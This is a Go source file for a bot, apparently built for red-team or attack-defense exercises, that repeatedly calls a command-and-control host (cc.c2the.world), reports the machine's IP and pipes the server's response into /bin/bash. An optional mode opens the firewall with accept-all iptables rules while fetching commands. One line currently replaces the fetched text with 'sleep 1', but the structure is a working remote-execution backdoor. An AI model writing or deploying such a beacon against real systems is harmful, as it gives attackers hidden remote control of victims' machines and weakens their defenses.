// Golang bot to pull commands from webserver and execute them
// Disclaimer: This barely works
// @author: degenerat3

package main

import (
	"io"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"os/exec"
	"time"
)

var serv = getServer() //IP of flask serv
var src = "snare"      // where is this calling back from
var loopTime = 60      //sleep time in secs

func getServer() string {
	//envVar := os.Getenv("SYS_OUTPUT") //fetch environment variable
	//trimmedStr := strings.Replace(envVar, "/etc/systemlogs/gaspell-", "", 1)
	//decoded, _ := b64.StdEncoding.DecodeString(trimmedStr)

	/**
	servs := make([]string, 0)
	servs = append(servs,
		"192.168.5.130",
		"192.168.5.146",
		"192.168.5.169",
		"192.168.5.171",
		"192.168.5.204",
		"192.168.5.21",
		"192.168.5.215",
		"192.168.5.218",
		"192.168.5.223",
		"192.168.5.250",
		"192.168.5.76",
		"192.168.6.137",
		"192.168.6.200",
		"192.168.6.202",
		"192.168.6.204",
		"192.168.6.44",
		"192.168.6.51",
		"192.168.6.63",
		"192.168.6.76",
		"192.168.6.95",
	)
	selection := servs[rand.Intn(len(servs))]
	return string(selection)
	*/
	return "cc.c2the.world"
}

func getIP() string {
	conn, _ := net.Dial("udp", "8.8.8.8:80")
	defer conn.Close()
	ad := conn.LocalAddr().(*net.UDPAddr)
	ipStr := ad.IP.String()
	return ipStr
}

func pokeHole() {
	exec.Command("/bin/bash", "-c", "/usr/bin/ipt-manager iptables -I INPUT 1 -j ACCEPT").Run()
	exec.Command("/bin/bash", "-c", "/usr/bin/ipt-manager iptables -I OUTPUT 1 -j ACCEPT").Run()
	getCommands()
	exec.Command("/bin/bash", "-c", "/usr/bin/ipt-manager iptables -D INPUT 1").Run()
	exec.Command("/bin/bash", "-c", "/usr/bin/ipt-manager iptables -D OUTPUT 1").Run()
}

func getCommands() {
	ip := getIP()
	url := "http://" + serv + "/" + ip + "/" + src
	r, err := http.Get(url)
	if err != nil {
		return
	}
	defer r.Body.Close()
	txt, err := ioutil.ReadAll(r.Body)
	txt = []byte("sleep 1")
	if err != nil {
		return
	}
	//exec.Command(string(txt))
	bsh := exec.Command("/bin/bash")
	stdin, _ := bsh.StdinPipe()
	go func() {
		defer stdin.Close()
		io.WriteString(stdin, string(txt))
	}()
	bsh.Run()
}

func main() {
	argslen := len(os.Args)
	if argslen < 2 {
		for {

			getCommands()
			time.Sleep(time.Duration(loopTime) * time.Second)
		}
	} else {
		if os.Args[1] == "-f" {
			pokeHole()
		} else {
			getCommands()
		}
	}

}
